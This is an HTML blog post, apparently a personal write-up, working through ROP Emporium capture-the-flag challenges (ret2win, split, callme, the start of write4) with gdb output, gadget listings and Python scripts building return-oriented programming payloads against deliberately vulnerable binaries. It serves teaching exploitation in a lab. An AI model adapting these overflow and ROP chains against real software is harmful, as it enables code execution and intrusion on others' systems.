@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="map[name:spook]">
+<meta name="description" content="While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from ROP Emporium.
+introduction to Rop Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack." />
+<meta name="keywords" content="cybersecurity, blog" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/posts/rop1/" />
+
+
+    <title>
+        
+            Rop writeups ret2win-write41 :: spook&#39;s blog  — spook&#39;s blog
+        
+    </title>
+
+
+
+
+
+<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Rop writeups ret2win-write41">
+  <meta itemprop="description" content="While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from ROP Emporium.
+introduction to Rop Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack.">
+  <meta itemprop="datePublished" content="2022-05-25T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2022-05-25T00:00:00+00:00">
+  <meta itemprop="wordCount" content="2211">
+  <meta itemprop="image" content="http://localhost:1313/">
+  <meta itemprop="keywords" content="Rop">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/"><meta name="twitter:title" content="Rop writeups ret2win-write41">
+<meta name="twitter:description" content="While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from ROP Emporium.
+introduction to Rop Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack.">
+
+
+
+    <meta property="og:url" content="http://localhost:1313/posts/rop1/">
+  <meta property="og:site_name" content="spook&#39;s blog">
+  <meta property="og:title" content="Rop writeups ret2win-write41">
+  <meta property="og:description" content="While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from ROP Emporium.
+introduction to Rop Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack.">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2022-05-25T00:00:00+00:00">
+    <meta property="article:modified_time" content="2022-05-25T00:00:00+00:00">
+    <meta property="og:image" content="http://localhost:1313/">
+
+
+
+
+
+
+    <meta property="article:published_time" content="2022-05-25 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text ">
+                hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="/about">About</a></li><li><a href="/posts">Blog</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        11 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="http://localhost:1313/posts/rop1/">Rop writeups ret2win-write41</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <p>While attempting to solve a CTF for a job interview, I learned the basics of crafting return-oriented programming exploits. This knowledge inspired me to create a write up for a few challenges that involve ROP from <a href="https://ropemporium.com/">ROP Emporium</a>.</p>
+<h1 id="introduction-to-rop">introduction to Rop</h1>
+<p>Return-oriented programming can be thought of as an advanced form of buffer overflow. The basic buffer overflow involves gaining control of the instruction pointer and then pointing it to shellcode code added to the stack. One protection against the basic buffer overflow is making the stack not executable. This protection means in the event a basic buffer overflow is attempted an exception is thrown once the instruction pointer is pointed to the shellcode on the stack.
+This protection does not fix the underlying problem. An attacker still has control over the instruction pointer. An attacker can still change the flow of execution of the program. An attacker cannot  execute on the stack, but an attacker can still point the instruction pointer to parts of the memory that has executable permissions.  The ROP exploit technique involves recycling code within the binary to cause unintended behavior. The technique is easier to understand once one looks at examples.</p>
+<h1 id="ret2win">ret2win</h1>
+<p>I begin with the first recommended challenge ret2win. I download the binary and begin by verifying the buffer overflow exists.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python -c <span style="color:#e6db74">&#34;print(&#39;a&#39;*100)&#34;</span> | ./ret2win32
+</span></span></code></pre></div><p>The program crashes as expected. It is now time to gain control over the instruction pointer. I used this <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/">website</a> to generate a cyclical pattern to feed into the program. I open the program in gdb, a debugger, so that I may inspect the registers after crashing the program. I get this output.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info registers
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>eip            0x35624134          0x35624134
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I feed this value back into the website from earlier. I discover bytes after the 44th end up in eip. I can control of the instruction pointer. In a normal buffer overflow, this control is used to execute the shellcode placed on the stack. This action cannot be done in this situation. The stack is not executable. No code written on the stack can be executed, but we can still redirect execution elsewhere within the binary.</p>
+<p>I begin by using the <code>info functions</code> function within gdb to see which functions are available within the binary. I spot a fairly interesting function called <code>ret2win</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions   
+</span></span><span style="display:flex;"><span>All defined functions:  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x0804862c ret2win
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I will redirect execution to the address associated with the ret2win function. I wrote a small python program to generate the desired payload.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span> <span style="color:#75715e"># padding for the first 44 bytes</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x0804862c</span>) <span style="color:#75715e"># address of ret2win</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out) 
+</span></span></code></pre></div><p>Running <code>python3 ret2win32.py | ./ret2win32</code> results in the flag being outputted.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 ret2win32.py | ./ret2win32  
+</span></span><span style="display:flex;"><span>ret2win by ROP Emporium  
+</span></span><span style="display:flex;"><span>x86  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>For my first trick, I will attempt to fit <span style="color:#ae81ff">56</span> bytes of user input into <span style="color:#ae81ff">32</span> bytes of stack buffer!  
+</span></span><span style="display:flex;"><span>What could possibly go wrong?  
+</span></span><span style="display:flex;"><span>You there, may I have your input please? And don<span style="color:#e6db74">&#39;t worry about null bytes, we&#39;</span>re using read<span style="color:#f92672">()</span>!  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>&gt; Thank you!  
+</span></span><span style="display:flex;"><span>Well <span style="color:#66d9ef">done</span>! Here<span style="color:#e6db74">&#39;s your flag:  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ROPE{a_placeholder_32byte_flag!}  
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">fish: Process 16443, &#39;</span>./ret2win32<span style="color:#e6db74">&#39; from job 1, &#39;</span>python3 ret2win32.py | ./ret2wi…<span style="color:#960050;background-color:#1e0010">&#39;</span> terminated by signal SIGSEGV <span style="color:#f92672">(</span>Address boundary error<span style="color:#f92672">)</span>
+</span></span></code></pre></div><h2 id="split">split</h2>
+<p>The offset is the same as the last binary 44. The prompt for the challenge suggests there will be a need to form a short rop chain. I begin by looking at the functions available.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions   
+</span></span><span style="display:flex;"><span>All defined functions:  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Non-debugging symbols:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x0804860c usefulFunction
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>I look at the disassembly of the <code>usefulFunction.</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble usefulFunction  
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulFunction:  
+</span></span><span style="display:flex;"><span>  0x0804860c &lt;+0&gt;:     push   %ebp  
+</span></span><span style="display:flex;"><span>  0x0804860d &lt;+1&gt;:     mov    %esp,%ebp  
+</span></span><span style="display:flex;"><span>  0x0804860f &lt;+3&gt;:     sub    $0x8,%esp  
+</span></span><span style="display:flex;"><span>  0x08048612 &lt;+6&gt;:     sub    $0xc,%esp  
+</span></span><span style="display:flex;"><span>  0x08048615 &lt;+9&gt;:     push   $0x804870e  
+</span></span><span style="display:flex;"><span>  0x0804861a &lt;+14&gt;:    call 0x80483e0 &lt;system@plt&gt;  
+</span></span><span style="display:flex;"><span>  0x0804861f &lt;+19&gt;:    add    $0x10,%esp  
+</span></span><span style="display:flex;"><span>  0x08048622 &lt;+22&gt;:    nop  
+</span></span><span style="display:flex;"><span>  0x08048623 &lt;+23&gt;:    leave   
+</span></span><span style="display:flex;"><span>  0x08048624 &lt;+24&gt;:    ret   
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>There is a call to <code>system().</code> The system function allows the program to call <a href="https://www.geeksforgeeks.org/system-call-in-c/">operating systems commands</a>. The system function accepts a pointer to a string containing the command to be executed. This function call will be useful for reading the flag. I only need to find a location in memory to pass to the function as an argument to pass to the function. I used edb to find where in memory the string <code>/bin/cat flag.txt</code> existed.</p>
+
+    <img src="/img/rop1/edb.png"  alt="Under construction"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>I then had everything needed to create the ROP chain.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x80483e0</span>) <span style="color:#75715e"># call to system</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x42</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span> <span style="color:#75715e"># fake return address</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x804a030</span>) <span style="color:#75715e"># arg 1 / location of string</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>Feeding this output into the vulnerable program results in the flag being outputted.</p>
+<h1 id="callme">callme</h1>
+<p>The offset is once again 44. For this binary, we will attempt to call multiple functions. The challenge explicitly states which function calls and which arguments are needed. I begin by finding the address of all the functions I wish to call. This is done with the <code>info functions</code> command used earlier in gdb. Care is taken to use the <code>@plt</code> version of the function.</p>
+<p>A trip to <a href="https://stackoverflow.com/questions/5469274/what-does-plt-mean-here">stack overflow</a> and a watch of a <a href="https://www.youtube.com/watch?v=kUk5pw4w0h4">LiveOverflow video</a>
+helped me understand what the @plt meant. Plt stands for procedure linkage table. The procedure linkage table is used when the compiler dynamically links an external library. The location of the function within the dynamically linked library that needs to be called cannot be known at compile time. As a result, the location of that function in the library is resolved when the binary is executed. The <code>@plt</code> version of the program is a stub that eventually leads to the calling of the actual desired function.</p>
+<p>Now I can think about how the stack should look when making multiple function calls. The ultimate goal is to make the stack look like so:</p>
+<pre tabindex="0"><code>----------------------
+|  etc   ...         |
+----------------------
+|  next function call|
+----------------------
+|  arg 3             |
+----------------------
+|  arg 2             |
+----------------------
+|  arg 1             |
+----------------------
+|  return address    |
+----------------------
+|  function call     |
+----------------------
+</code></pre><p>The return address, in this case, should be a rop gadget that pops three items off the stack. Removing the arguments from the stacks cleans up the stack so that the next function call can happen smoothly. There exist several programs that can find rop gadgets within binaries. I used <a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a> in this situation. The command <code>ROPgadget --binary callme32</code> can be used to see some possibly useful gadgets within the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Gadgets information  
+</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>0x080487f9 : pop esi ; pop edi ; pop ebp ; ret
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> struct
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x41</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">44</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080484f0</span>) <span style="color:#75715e"># callme_one@plt</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080487f9</span>) <span style="color:#75715e"># gadget with 3 pops</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xdeadbeef</span>) <span style="color:#75715e"># arg 1</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xcafebabe</span>) <span style="color:#75715e"># arg 2</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xd00df00d</span>) <span style="color:#75715e"># arg 3</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x08048550</span>) <span style="color:#75715e"># callme_two@plt</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080487f9</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xcafebabe</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xd00df00d</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080484e0</span>) <span style="color:#75715e"># callme_three@plt</span>
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0x080487f9</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xdeadbeef</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xcafebabe</span>)
+</span></span><span style="display:flex;"><span>buf<span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;&lt;L&#39;</span>,<span style="color:#ae81ff">0xd00df00d</span>)
+</span></span><span style="display:flex;"><span>out<span style="color:#f92672">=</span> bytes(buf)
+</span></span><span style="display:flex;"><span>sys<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>buffer<span style="color:#f92672">.</span>write(out)
+</span></span></code></pre></div><p>Running the program outputs the flag.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>callme by ROP Emporium  
+</span></span><span style="display:flex;"><span>x86  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Hope you read the instructions...  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>&gt; Thank you!  
+</span></span><span style="display:flex;"><span>callme_one<span style="color:#f92672">()</span> called correctly  
+</span></span><span style="display:flex;"><span>callme_two<span style="color:#f92672">()</span> called correctly  
+</span></span><span style="display:flex;"><span>ROPE<span style="color:#f92672">{</span>a_placeholder_32byte_flag!<span style="color:#f92672">}</span>
+</span></span></code></pre></div><h1 id="write4">write4</h1>
+<p>The offset is still 44.</p>
+<p>I begin by looking at the functions.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions    
+</span></span><span style="display:flex;"><span>All defined functions:  
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>Non-debugging symbols:  
+</span></span><span style="display:flex;"><span>0x0804837c  _init  
+</span></span><span style="display:flex;"><span>0x080483b0  pwnme@plt  
+</span></span><span style="display:flex;"><span>0x080483c0  __libc_start_main@plt  
+</span></span><span style="display:flex;"><span>0x080483d0  print_file@plt  
+</span></span><span style="display:flex;"><span>0x080483e0  __gmon_start__@plt  
+</span></span><span style="display:flex;"><span>0x080483f0  _start  
+</span></span><span style="display:flex;"><span>0x08048430  _dl_relocate_static_pie  
+</span></span><span style="display:flex;"><span>0x08048440  __x86.get_pc_thunk.bx  
+</span></span><span style="display:flex;"><span>0x08048450  deregister_tm_clones  
+</span></span><span style="display:flex;"><span>0x08048490  register_tm_clones  
+</span></span><span style="display:flex;"><span>0x080484d0  __do_global_dtors_aux  
+</span></span><span style="display:flex;"><span>0x08048500  frame_dummy  
+</span></span><span style="display:flex;"><span>0x08048506  main  
+</span></span><span style="display:flex;"><span>0x0804852a  usefulFunction  
+</span></span><span style="display:flex;"><span>0x08048543  usefulGadgets  
+</span></span><span style="display:flex;"><span>0x08048550  __libc_csu_init  
+</span></span><span style="display:flex;"><span>0x080485b0  __libc_csu_fini  
+</span></span><span style="display:flex;"><span>0x080485b4  _fini
+</span></span></code></pre></div><p>The usefulFunction and usefulGadgets functions look interesting, so I examine them more closely.</p>
+<p>The usefulFunction disassembly seems to contain the print_file function I need to call with the argument &ldquo;flag.txt&rdquo; according to the instructions in the challenge.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble usefulFunction      
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulFunction:  
+</span></span><span style="display:flex;"><span>  0x0804852a &lt;+0&gt;:     push   ebp  
+</span></span><span style="display:flex;"><span>  0x0804852b &lt;+1&gt;:     mov    ebp,esp  
+</span></span><span style="display:flex;"><span>  0x0804852d &lt;+3&gt;:     sub    esp,0x8  
+</span></span><span style="display:flex;"><span>  0x08048530 &lt;+6&gt;:     sub    esp,0xc  
+</span></span><span style="display:flex;"><span>  0x08048533 &lt;+9&gt;:     push   0x80485d0  
+</span></span><span style="display:flex;"><span>  0x08048538 &lt;+14&gt;:    call   0x80483d0 &lt;print_file@plt&gt;  
+</span></span><span style="display:flex;"><span>  0x0804853d &lt;+19&gt;:    add    esp,0x10  
+</span></span><span style="display:flex;"><span>  0x08048540 &lt;+22&gt;:    nop  
+</span></span><span style="display:flex;"><span>  0x08048541 &lt;+23&gt;:    leave     
+</span></span><span style="display:flex;"><span>  0x08048542 &lt;+24&gt;:    ret       
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>The usefulGadgets function contains one apparently useful gadget. The gadget at <code>0x08048543</code> allows me to move the contents of ebp into the memory address pointed to by the register edi.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> disassemble usefulGadgets      
+</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">function</span> usefulGadgets:  
+</span></span><span style="display:flex;"><span>  0x08048543 &lt;+0&gt;:     mov    DWORD PTR <span style="color:#f92672">[</span>edi<span style="color:#f92672">]</span>,ebp  
+</span></span><span style="display:flex;"><span>  0x08048545 &lt;+2&gt;:     ret       
+</span></span><span style="display:flex;"><span>  0x08048546 &lt;+3&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x08048548 &lt;+5&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x0804854a &lt;+7&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x0804854c &lt;+9&gt;:     xchg   ax,ax  
+</span></span><span style="display:flex;"><span>  0x0804854e &lt;+11&gt;:    xchg   ax,ax  
+</span></span><span style="display:flex;"><span>End of assembler dump.
+</span></span></code></pre></div><p>The first order of business is finding a place within the binary that can be overwritten without breaking anything. Readelf can be used to look at the sections of the binary.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt; readelf -a write432
+</span></span><span style="display:flex;"><span>Section Headers:  
+</span></span><span style="display:flex;"><span> ...
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>20<span style="color:#f92672">]</span> .fini_array       FINI_ARRAY      08049f00 000f00 <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>21<span style="color:#f92672">]</span> .dynamic          DYNAMIC         08049f04 000f04 0000f8 <span style="color:#ae81ff">08</span>  WA  <span style="color:#ae81ff">6</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>22<span style="color:#f92672">]</span> .got              PROGBITS        08049ffc 000ffc <span style="color:#ae81ff">000004</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
+</span></span><span style="display:flex;"><span> <span style="color:#f92672">[</span>23<span style="color:#f92672">]</span> .got.plt          PROGBITS        0804a000 <span style="color:#ae81ff">001000</span> <span style="color:#ae81ff">000018</span> <span style="color:#ae81ff">04</span>  WA  <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">0</span>  <span style="color:#ae81ff">4</span>  
